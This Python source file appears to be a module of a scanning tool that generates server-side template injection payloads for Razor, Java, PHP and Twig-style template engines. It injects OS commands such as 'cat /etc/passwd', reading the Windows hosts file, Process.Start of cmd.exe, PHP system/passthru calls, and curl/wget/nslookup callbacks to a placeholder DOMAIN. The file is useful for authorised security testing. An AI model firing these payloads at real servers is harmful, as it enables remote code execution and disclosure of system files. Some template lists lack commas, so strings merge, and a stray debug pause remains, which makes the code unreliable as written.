from pluck.module import GenerationModule



class TemplateInjectionGenerator(GenerationModule):
    def __init__(self):
        super().__init__()

        self.num = 1337
        self.num2 = 7

        self.polyglot ="${{<%[%\\'"+'"}}%\\.'
        
        self.windows_commands = [
            'echo UNIQUE',
            'timeout /T TIMEOUT',
            'type C:\\Windows\\System32\\drivers\\etc\\hosts',
            'wget http://DOMAIN/UNIQUE',
            'curl http://DOMAIN/UNIQUE',
            'nslookup DOMAIN'
        ]

        self.linux_commands = [
            'echo UNIQ',
            'sleep TIMEOUT',
            'curl http://DOMAIN/UNIQUE',
            'wget http://DOMAIN/UNIQUE',
            'nslookup DOMAIN',
            'cat /etc/passwd',
        ]

        self.evidence_strings = [
            str(self.num*self.num),
            str(self.num2*self.unique_string),
            str(self.num)+str(self.num),
            "Copyright (c) 1993-2009 Microsoft Corp.",
            "This is a sample HOSTS file used by Microsoft TCP/IP for Windows",
            "root:x:0:0:root:/root"
        ]        
        

    def generate_payloads(self):
        result = []

        # Add the polyglot first
        result.append(self.polyglot)
        
        razor_payloads = self.generate_razor_payloads()
        result += razor_payloads

        java_payloads = self.generate_java_payloads()
        result += java_payloads

        url_encoded = self.url_encode(result)
        result += url_encoded

        for r in result: print(r)
        input()
        return result

    def generate_from_templates(self, templates, windows_payloads=True, linux_payloads=True):

        result = []
        
        a = [
            ("NUM",self.num),
            ("MULTIP", self.num2)
        ]

        # Create payloads
        changed =  [self.change_variables(t,additional=a) for t in templates]

        # Change payloads in templates
        for c in changed:
            if "PAYLOAD" in c:
                if windows_payloads:
                    for p in self.windows_commands:
                        result.append(c.replace("PAYLOAD",self.change_variables(p)))
                if linux_payloads:
                    for p in self.linux_commands:
                        result.append(c.replace("PAYLOAD",self.change_variables(p)))
            else:
                result.append(c)

        return result 

    def generate_razor_payloads(self):
        templates = [
            "@(NUM*NUM)", "@(\"NUM\"+\"NUM\")",
            '@(MULTIP*"UNIQUE")',
            "@{Response.Write(\"UNIQUE\");}", "@{@:UNIQUE}",
            "@{@Html.Raw(\"UNIQUE\")}", "@{Console.WriteLine(\"UNIQUE\");}"
            "@{ System.Diagnostics.Process.Start(\"cmd.exe\", \"/c PAYLOAD\"); }"
        ]

        return self.generate_from_templates(templates, windows_payloads=True, linux_payloads=False)

    def generate_java_payloads(self):
        basic_payloads = ['NUM*NUM','MULTIP*\"UNIQUE\"','\"NUM\"+\"NUM\"']



        templates = [
            "#{INJ}",
            "${INJ}",
            "[=INJ]",
            "{{INJ}}",
            "*{INJ}",
            "[[ INJ ]]",
            "[INJ]",
            "{INJ}",
            "{{=INJ}}",
            "<%INJ%>",
            "<%=INJ%>"
            "#{INJ}",
            "{php}PAYLOAD;{/php}",
            "{system('PAYLOAD')}",
            "{{['PAYLOAD']|map('passthru')}}",
            "{{['PAYLOAD']|filter('passthru')}}",
            "{{['PAYLOAD']|filter('system')}}",
            "{php system('PAYLOAD')}"
        ]


        payloads = [t.replace("INJ", p) for t in templates for p in basic_payloads]

        return self.generate_from_templates(payloads, windows_payloads=True, linux_payloads=True)


